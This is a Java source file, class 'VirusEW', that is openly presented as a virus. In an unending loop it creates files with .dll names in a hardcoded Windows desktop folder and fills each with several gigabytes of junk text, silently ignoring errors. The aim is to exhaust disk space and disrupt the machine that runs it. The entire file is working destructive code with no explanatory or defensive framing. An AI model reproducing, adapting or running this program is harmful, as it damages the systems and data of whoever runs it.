import java.io.*;
class VirusEW
{
    public static void main(String args [])
    {
        try
        {
            char A='A';
            while(true)
            {
                FileWriter f = new FileWriter("C:/Users/Aditya/Desktop/JAVA/Virus"+A+".dll");
                for(int x=0;x<=14207146;x++)
                f.write("kudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzfkudmfksjkfjskifukkjfizzf");
                A++;
            }
        }
        catch(FileNotFoundException e){}
        catch(IOException e1){}
    }
}